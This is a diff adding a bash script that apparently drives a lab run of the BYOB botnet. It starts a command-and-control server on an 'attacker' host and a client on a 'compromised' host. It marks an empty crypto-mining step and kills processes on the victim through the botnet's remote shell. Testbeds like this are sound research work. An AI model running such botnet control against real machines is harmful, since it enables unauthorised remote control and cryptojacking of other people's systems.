@@ -1,0 +1,37 @@
+#!/bin/bash
+
+remote_kill() {
+    node=$1
+    prog=$2
+    ssh $node "sudo kill \$(ps -e | grep $prog | awk '{print \$1}')"
+}
+
+
+ssh attacker "cd ~/byob && ./server.py --background" &
+attackerPid=$1
+
+sleep 5 # let the server boot
+
+ssh compromised "sudo byob-client" &
+victimPid=$!
+
+sleep 5 # let the victim connect
+
+
+# Start crypto mining
+
+
+
+# wait
+sleep 8
+
+# Kill byob on client via byob
+ssh attacker "byossh compromised sudo kill \$(ps -e | grep python | awk '{print \$1}')"
+ssh attacker "byossh compromised sudo kill \$(ps -e | grep byob | awk '{print \$1}')"
+
+# Kill byob server on attacker
+remote_kill attacker server
+remote_kill attacker python
+
+sleep 8 # Make sure all the data downloads
+
